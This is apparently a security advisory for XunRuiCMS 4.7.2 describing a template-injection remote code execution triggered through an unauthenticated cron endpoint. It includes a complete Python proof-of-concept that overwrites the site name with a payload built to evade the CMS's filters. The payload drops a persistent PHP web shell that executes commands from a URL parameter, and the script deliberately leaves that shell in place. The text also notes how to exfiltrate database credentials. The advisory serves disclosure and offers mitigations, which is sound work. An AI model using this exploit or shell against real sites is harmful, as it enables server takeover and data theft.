# XunRuiCMS / XunRuiPHP 4.7.2 — Anonymous-trigger RCE via site name + notification-template compilation

- **Product**: XunRuiCMS (XunRuiPHP)
- **Version**: 4.7.2
- **CWE**: CWE-94 / CWE-1336 (code generation / template engine injection)
- **Impact**: Remote Code Execution as the web-server user
- **Privilege**: **the execution trigger is unauthenticated** — the task runner `index.php?s=api&c=run&m=index` compiles and `require`s the payload with **no login** when `SYS_CRON_AUTH=0` (default); only the one-time payload write uses a back-end session
- **Attack path**: site setting → notification setting → a notice-queueing back-end action → **anonymous** task runner → template compile
- **Relevant code**
  - `dayrui/Fcms/Library/Notice.php` — `_get_tpl_content()`: substitutes `{SITE_NAME}` into the template **source**, then compiles it (`code2php()` + `require`)
  - `dayrui/Fcms/Model/Cron.php` — `add_cron()` (queueing)
  - `dayrui/Fcms/Control/Api/Run.php` — task runner (`index.php?s=api&c=run&m=index`)
  - site name is stored verbatim by the site-config save
- **Tested on**: XunRuiCMS 4.7.2 · PHP 7.4.33 · Apache 2.4 (Debian) · MySQL 8.0.46 · web root `/var/www/html`

## Summary

Business data (the site name) is substituted into notification-template **source code** before that source is compiled and `require`d. Once a `{php …}` tag sits in the site name, **any anonymous request** to the task runner makes it execute: `index.php?s=api&c=run&m=index` compiles and `require`s the template with no login (`SYS_CRON_AUTH=0`). Writing the payload once is a back-end action; the request that triggers execution is not — and the payload survives all input filters of the application.

## Root cause

```php
// dayrui/Fcms/Library/Notice.php  →  _get_tpl_content($siteid, $name, $type, $data)
$content_code = file_get_contents($my);                 // e.g. config/notice/email/module_content_delete.html
if (isset(\Phpcmf\Service::C()->site_info[$siteid])) {
    $site_info    = \Phpcmf\Service::C()->site_info[$siteid];
    $content_code = str_replace('{SITE_NAME}', $site_info['SITE_NAME'], $content_code);   // ← raw value into template source
    $content_code = str_replace('{SITE_URL}',  $site_info['SITE_URL'],  $content_code);
}
ob_start();
extract($data, EXTR_OVERWRITE);
$require_file = \Phpcmf\Service::V()->code2php($content_code);   // ← {php …} / {code …} compiled, then required
```

All 13 e-mail notice templates under `config/notice/email/*.html` contain `{SITE_NAME}`, so any of them can be used as the rendering vehicle. Because the site name is inserted *before* compilation, the attacker controls template source code, not just a variable value.

Queue path:

1. `Notice::send_notice()` → `Cron::add_cron()` (`Fcms/Model/Cron.php:11`) — if `cache/config/run_lock.php` does not exist the CMS tries a thread self-request, otherwise the task stays queued.
2. `Fcms/Control/Api/Run.php` (`index.php?s=api&c=run&m=index&num=20&is_cdn=1`) executes the queue; with `SYS_CRON_AUTH=0` this endpoint needs **no login**. It is throttled for 100 s via `cache/config/cron_run_time.php`, takes only the first 20 rows, and `&is_cdn=1` makes `run_cron()` call `do_cron()` synchronously inside the same request.
3. `Notice::cron_notice()` → `_send_email()` → `_get_tpl_content()` → compile + `require` → **code execution**.

`_get_tpl_content()` runs **before** `Email::sendmail()`, therefore **no SMTP server needs to be configured** for the payload to execute; the later SMTP failure is only recorded in `dr_cron.error` (see the note in Step 4).

## Payload constraints (observed)

| Constraint | Cause | Consequence |
|---|---|---|
| no `<`, `>`, `;` | the raw request array is assigned into the template through `Input::get('', true)` → `xss_clean()`, which mangles these characters | build the opening tag with `chr(60)`, avoid comparisons/statement separators |
| no literal `eval(` | CI4 `Security` rewrites `eval(…)` into `eval&#40;…&#41;` | when an eval-based payload is needed, split the string: `'ev'.'al'.chr(40)` |
| `file_put_contents(` and `chr(` are **not** filtered | — | used to drop the shell |

## Proof of concept

Back-end entry: the CMS back end is reached through a **randomly named** entry file created by the installer (its whole content is `define('IS_ADMIN', TRUE); require('index.php');`); on the lab it is `admin82b8542a912e.php`, while `admin.php` answers `404`. All requests below use `/<entry>.php`.

About the e-mail error above: it is expected and irrelevant. The notice *channel* is e-mail, so the task records an SMTP error, but `_get_tpl_content()` (template **compile + require**, i.e. the code execution) runs **before** `Email::sendmail()` — which is exactly why no SMTP server is needed. The `Run 1` line and the shell output are the primary evidence; the `dr_cron` row only shows that the queue processed the task.

## PoC script (`1.py`)

```
python 1.py http://<target> "<cookie>" admin82b8542a912e.php
```

```python
import sys, re, requests

b = sys.argv[1].rstrip("/")
ck = sys.argv[2]
e = sys.argv[3] if len(sys.argv) > 3 else "admin.php"
catid, mod = "200", "news"
s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120"
s.headers["Cookie"] = ck
a = b + "/" + e


def p(label, r, n=100):
    print("%-14s HTTP %-4s %s" % (label, r.status_code, r.text[:n].replace("\n", " ")), flush=True)
    return r


if p("entry", s.get(a, allow_redirects=False)).status_code == 404:
    print("admin entry not found: /%s" % e)
    sys.exit(1)

r = p("session", s.get(a + "?s=cms&c=site_config&m=index", allow_redirects=False))
if r.status_code != 200:
    print("invalid session: cookie expired or User-Agent mismatch")
    sys.exit(1)

pay = "ZZSITE_{php echo file_put_contents($_SERVER['DOCUMENT_ROOT'].'/zz_shell.php',chr(60).'?php echo '.chr(96).'$_GET[0]'.chr(96).';');}"
d = {"data[SITE_NAME]": pay, "data[SITE_LANGUAGE]": "zh-cn", "data[SITE_TEMPLATE]": "default",
     "data[SITE_THEME]": "default", "data[SITE_CLOSE]": "0", "data[SITE_INDEX_HTML]": "0",
     "data[SITE_TIMEZONE]": "8"}
h = s.get(a + "?s=cms&c=site_config&m=index").text
m = re.search(r'name="data\[SITE_NAME\]"[^>]*?value="([^"]*)"', h)
orig = m.group(1) if m else ""
if '"code":1' not in p("write-site", s.post(a + "?s=cms&c=site_config&m=index", data=d,
                                            allow_redirects=False)).text:
    print("write failed: invalid session")
    sys.exit(1)

p("enable-notice", s.post(a + "?s=member&c=setting_notice&m=add",
                          data={"data[module_content_delete][email]": "1"}))

au = '%s&c=home&m=add&catid=%s' % (mod, catid)
h = s.get(a + "?s=" + au).text
d = dict(re.findall(r'name="([^"]+)"[^>]*?value="([^"]*)"', h))
for k, body in re.findall(r'name="([^"]+)"(.*?)</select>', h, re.S):
    m = re.search(r'<option[^>]*selected[^>]*value="([^"]*)"', body)
    d.setdefault(k, m.group(1) if m else "")
d.update({"data[title]": "zztmp", "data[content]": "zz",
          "catid": catid, "data[catid]": catid, "id": "0", "module": mod})
r = p("content-add", s.post(a + "?s=" + au, data=d))
m = re.search(r'"id":(\d+)', r.text)
cid = m.group(1) if m else "0"
try:
    p("content-del", s.post(a + "?s=%s&c=home&m=del&catid=%s" % (mod, catid),
                             data=[("ids[]", cid)], timeout=60))
except requests.exceptions.ReadTimeout:
    print("content-del timeout", flush=True)

r = p("cron-run", s.get(b + "/index.php?s=api&c=run&m=index&num=20&is_cdn=1"))
if "Run Ok" in r.text:
    print("Run Ok = 0 tasks")
r = p("shell", s.get(b + "/zz_shell.php?0=id"))
if r.text.strip() == "":
    p("shell", s.get(b + "/zz_shell.php?0=whoami"))

if orig:
    p("restore-name", s.post(a + "?s=cms&c=site_config&m=index",
                             data={"data[SITE_NAME]": orig}, allow_redirects=False))
print("\ndone")
```

Notes for the operator: the back-end session is bound to the User-Agent (and is invalidated by a password change), so use the cookie of the client you are working with; after a wrong entry name the write requests answer `404` and the runner answers `Run Ok` (**0** tasks). On a single-worker FastCGI the `content-del` call may time out on the client side because the CMS performs a cron self-request — the deletion is still processed server-side; multi-worker Apache answers normally. The script captures the original site name **before** the overwrite and restores **only that field** once the shell is confirmed; the dropped shell is intentionally left in place.

## Database-driver independence

The chain does not depend on the DBMS: the site name is stored/read through the query builder, the notification template is compiled from the stored *value*, and the queue row in `dr_cron` is driver-independent. The CMS ships `MySQLi`, `SQLite3`, `Postgre` and `SQLSRV` drivers generated from the same PHP field definitions, so the same payload applies to all of them.

## Impact

Arbitrary code execution as the web-server user (`www-data`), reachable through ordinary back-end operations (site setting + notification setting + any notice-queueing event such as content delete / login / registration / payment). The dropped PHP file is a persistent backdoor (`/zz_shell.php?0=<command>`); the application configuration can be exfiltrated, including the database credentials stored in plaintext in `config/database.php`.

## Mitigation

1. Do not substitute business data into template *source*. Compile the notification template first, then substitute escaped values, or expose the site name to the template as a variable (`{$site_name}` via `View::assign`) instead of a textual `str_replace`.
2. Strip/escape template control characters (`{`, `}`, `$`) from site information fields (site name, close message, …) before they can reach a template compiler.
3. Restrict site-configuration write permission to a dedicated role and audit values that are later rendered by the template engine.
4. Require authentication/authorization for the task runner (`index.php?s=api&c=run&m=index`), always define `SYS_CRON_AUTH`, and remove the `is_cdn` synchronous execution path in production.
5. Never call `eval`-like compilation on data-driven content: keep `{php}` / `{code}` tags limited to trusted static template files.
